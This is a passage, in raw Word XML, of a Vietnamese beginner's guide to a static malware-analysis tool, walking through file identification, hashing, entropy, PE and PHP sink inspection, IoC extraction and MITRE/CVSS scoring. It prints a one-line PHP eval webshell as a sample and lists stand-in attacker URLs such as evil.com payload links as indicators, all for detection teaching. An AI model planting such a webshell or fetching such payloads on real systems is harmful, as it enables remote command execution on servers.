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GIẢI THÍCH CHI TIẾT — HỆ THỐNG PHÂN TÍCH MÃ ĐỘC HOẠT ĐỘNG NHƯ THẾ NÀO</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>Tài liệu này giải thích từng bước một, cho người chưa biết gì về bảo mật.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>PHẦN 1: NGUYÊN LÝ CĂN BẢN</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1.1. Mã độc (malware) là gì?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Mã độc là một đoạn chương trình được viết ra với mục đích xấu: đánh cắp dữ liệu,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>chiếm quyền điều khiển máy, phá hoại, hoặc mã hóa tống tiền.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ví dụ đơn giản nhất — một webshell (con "vỏ ốc" độc giấu trong máy chủ web):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>&lt;?php</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>eval($_POST['cmd']);   // ← toàn bộ "vũ khí" chỉ gói trong 1 dòng này</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>?&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Giải thích từng chữ:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`&lt;?php ... ?&gt;` — báo hiệu đây là mã PHP (ngôn ngữ chạy trên máy chủ web).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`eval(...)` — lệnh "chạy thử chuỗi bên trong như một câu lệnh PHP". Nghĩa là: đưa gì vào, nó chạy cái đó.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`$_POST['cmd']` — lấy dữ liệu người dùng gửi lên từ trình duyệt (`cmd` = command = lệnh).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Hệ quả:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Kẻ tấn công mở trình duyệt, gửi lên máy chủ một "lệnh" (ví dụ xóa file,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>xem mật khẩu). Máy chủ sẽ mù quáng thực thi, vì code viết sẵn `eval()` mà không kiểm tra ai gửi.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="6B7280"/>
        </w:rPr>
        <w:t>Đây chính là thứ hệ thống của chúng ta đi SĂN TÌM.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1.2. Phân tích tĩnh khác gì phân tích động?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Có 2 cách điều tra một mẫu đáng ngờ:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   |   Phân tích TĨNH   |   Phân tích ĐỘNG </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Cách làm   |   ĐỌC file, không chạy   |   CHẠY file trong lồng cách ly (sandbox) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Ví von   |   Mổ xác để khám bệnh   |   Bắt sống, tra hỏi hành vi </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Ưu   |   An toàn, nhanh   |   Thấy hành vi thật </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Nhược   |   Khó thấy mã tự giấu (packed)   |   Nguy hiểm, cần môi trường riêng </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Hệ thống này dùng phân tích TĨNH</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — chỉ "đọc" file, mổ xẻ cấu trúc bên trong,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>tuyệt đối KHÔNG chạy nó nên không bao giờ bị lây nhiễm.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>PHẦN 2: HỆ THỐNG GỒM NHỮNG GÌ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.1. Hai bộ phận</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Frontend</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (giao diện web) — thứ ta bấm, kéo-thả file vào.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Viết bằng HTML/CSS/JavaScript. Chạy trên GitHub Pages (miễn phí, tĩnh).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">2. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Backend</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (bộ não Python) — thứ thực sự đọc và phân tích file.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Viết bằng Python + FastAPI. Chạy trên Render (miễn phí, động).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.2. Vì sao cần 2 phần?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Vì trình duyệt (frontend) không đủ mạnh để đọc PE header, chạy YARA...</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Nên file được gửi lên backend Python phân tích sâu, rồi trả kết quả về hiển thị.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.3. Các module phân tích (file Python)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> File   |   Nhiệm vụ </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> `malware_analyzer.py`   |   Phân tích tổng hợp: hash, entropy, PE, IoC, phân loại họ </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> `yara_engine.py`   |   Nạp + biên dịch YARA rules, quét mẫu </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> `webshell_detector.py`   |   Regex + theo dõi luồng dữ liệu + phát hiện polyglot </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> `cvss_scoring.py`   |   Chấm điểm CVSS 3.1 + ánh xạ CWE + MITRE ATT&amp;CK </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> `api_server.py`   |   FastAPI nhận file upload, gọi các module trên </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>PHẦN 3: 6 BƯỚC MỔ XẺ (GIẢI THÍCH CHI TIẾT NHẤT)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Khi đưa 1 file vào, hệ thống làm 6 việc tuần tự:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>BƯỚC 1 — Nhận diện "đây là loại file gì"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Mục đích:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Biết đang đối mặt với cái gì để chọn đúng "dụng cụ" mổ xẻ.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Cách làm:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Đọc </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>magic bytes</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — vài byte đầu của file, là "chữ ký" nhận dạng loại file.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Magic bytes (đầu file)   |   Ý nghĩa </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> `MZ`   |   File chạy Windows (.exe / .dll) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> `&lt;?php`   |   Mã PHP </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> `#!`   |   Shell script (Linux) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> `PK`   |   File nén ZIP </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> `7fELF`   |   File chạy Linux (ELF) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> `%PDF`   |   Tài liệu PDF </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Chú thích đời thường:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Mọi file máy tính đều có vài byte đầu "khai báo" nó là gì.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>`MZ` là viết tắt tên Mark Zbikowski (kỹ sư tạo ra định dạng PE).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Thấy `MZ` → biết ngay là file Windows → sẽ dùng công cụ đọc PE ở Bước 4.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>BƯỚC 2 — Băm mật mã (hash)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Mục đích:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Lấy "dấu vân tay" duy nhất của file.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Cách làm:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Cho toàn bộ nội dung chạy qua hàm băm (MD5, SHA-256, SHA-512)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="6B7280"/>
        </w:rPr>
        <w:t>ra một chuỗi ký tự độ dài cố định.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Ví dụ thật:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>MD5:     b4222ff24fe7e5c52d5df6a984882dad</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>SHA-256: e629ed334ebb3597421a8053fdc8dfce36f5b726d011bd39fa421d6448f41579</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Tại sao hash quan trọng:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Hai file GIỐNG HỆT nhau → hash GIỐNG Y HỆT nhau.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Chỉ sửa 1 ký tự → hash khác HOÀN TOÀN.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Nên hash là "chứng minh thư" của file.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Công dụng thực tế:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Lấy hash lên </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>VirusTotal</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (web tra cứu miễn phí)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="6B7280"/>
        </w:rPr>
        <w:t>biết "hash này từng bị 60 phần mềm diệt virus phát hiện chưa".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Nếu có → kết luận ngay đây là mã độc đã biết.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>BƯỚC 3 — Đo Entropy</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Mục đích:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Phát hiện file có bị "nén/mã hóa" để che giấu không.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Hiểu theo đời thường:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>File văn bản / mã nguồn → chữ lặp lại, có trật tự → entropy THẤP (4–6).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>File nén (.zip) / mã hóa → byte "loạn" hết, không đoán được → entropy CAO (≈7–8).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Chú thích:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Kẻ viết mã độc thường NÉN hoặc MÃ HÓA code (gọi là "pack")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>để phần mềm diệt virus không đọc được.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Ví dụ: webshell đơn giản entropy 5.31 (thấp → mã đọc được bình thường),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>nhưng file `upx_packed.exe` entropy 7.8 (cao → nghi bị pack).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>BƯỚC 4 — Mổ xẻ cấu trúc (bước hay nhất)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Chia 2 nhánh tùy loại file:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Nhánh A — File Windows (.exe):</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> đọc PE header</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Import Table** = danh sách hàm Windows mà file "mượn" dùng. Nếu thấy hàm nhạy cảm:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  - `CreateProcess` → mở chương trình khác</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  - `socket` / `connect` → kết nối mạng ra ngoài</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  - `VirtualAlloc` / `WriteProcessMemory` → tự nhét code vào tiến trình khác</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  → Đây là hành vi mã độc, không phải phần mềm lành.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Section** (.text, .data...) + đo entropy từng section để phát hiện packer.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Nhánh B — Script (PHP/Python...):</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> đọc mã nguồn, tìm "lệnh sink" (điểm nguy hiểm):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`eval`, `system`, `shell_exec`, `exec` → thực thi lệnh</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`base64_decode`, `gzinflate` → giải mã thứ đang bị giấu</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`fsockopen`, `socket` → kết nối mạng</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Chú thích về "data flow" (theo dõi luồng dữ liệu):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Hệ thống không chỉ tìm lệnh nguy hiểm đơn lẻ, mà còn THEO DÕI DÒNG CHẢY:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>dữ liệu từ người dùng (`$_POST`) → đi qua giải mã → đổ vào hàm nguy hiểm (`eval`).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Đủ chuỗi này mới kết luận nguy hiểm thật (tránh báo nhầm file chỉ tình cờ chứa chữ "eval").</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>BƯỚC 5 — Trích xuất IoC (dấu vết xâm nhập)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Mục đích:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Tìm địa chỉ máy chủ điều khiển (C2) mà mã độc kết nối về.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Cách làm:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Dùng regex (công cụ tìm mẫu chuỗi) quét nội dung, bắt:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**IP**: `192.168.1.50`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**URL**: `http://evil.com/payload.exe`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Domain**: `evil.com`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Chú thích:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Mã độc thường "gọi điện về tổng hành dinh" của hacker (C2 = Command &amp; Control).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Tìm được địa chỉ này → chặn ở tường lửa → cắt liên lạc + truy vết hacker.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Ví dụ: webshell đơn giản KHÔNG có IoC (tấn công trực tiếp, không cần C2).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Nhưng PowerShell downloader có IoC: `http://evil.com/payload.ps1`.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>BƯỚC 6 — Kết luận</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Tổng hợp 5 bước để phán quyết cuối:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Tìm thấy lệnh sink + nguồn input + (có thể) IoC → **MÃ ĐỘC**, gán họ (webshell, RAT...).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ánh xạ **MITRE ATT&amp;CK** (bảng chuẩn toàn cầu phân loại chiến thuật/kỹ thuật tấn công):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  - webshell = T1505.003, command execution = T1059.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Gán **CWE** (mã lỗi bảo mật): ví dụ CWE-94 = lỗi "thực thi mã".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Chấm **CVSS** (điểm nghiêm trọng 0–10): reverse shell = 10.0 (cao nhất).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>PHẦN 4: BẢNG TÓM TẮT 1 CÂU CHO TỪNG BƯỚC</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Bước   |   Câu dễ hiểu </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1. Nhận diện   |   "Đây là file gì?" (đọc chữ ký đầu file) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2. Hash   |   "Lấy dấu vân tay để tra danh tiếng" </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> 3. Entropy   |   "Có bị nén/mã hóa để giấu không?" </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> 4. Mổ xẻ   |   "Nó gọi hàm gì, chạy lệnh gì nguy hiểm?" </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> 5. IoC   |   "Nó liên lạc với máy hacker nào?" </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> 6. Kết luận   |   "Tóm lại: có độc không, độc cỡ nào?" </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>PHẦN 5: VÍ DỤ MỔ XẺ 1 FILE CỤ THỂ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Giả sử hệ thống nhận file `shell.php`:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>&lt;?php</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>@eval($_POST['cmd']);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>?&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Bước   |   Kết quả hệ thống trả về   |   Giải nghĩa </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1   |   `PHP script`   |   Đầu file là `&lt;?php` → là mã PHP </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
